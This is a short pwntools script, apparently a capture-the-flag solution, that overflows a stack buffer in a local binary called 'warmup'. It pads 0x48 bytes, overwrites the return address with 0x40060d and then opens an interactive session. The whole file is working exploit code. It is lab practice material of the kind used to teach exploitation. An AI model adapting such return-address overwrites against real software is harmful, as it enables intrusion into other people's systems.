from pwn import *

p= process("./warmup")

pad = b"a"*0x48
ret_add = p64(0x40060d)
payload = pad +ret_add

p.sendline(payload)

p.interactive()
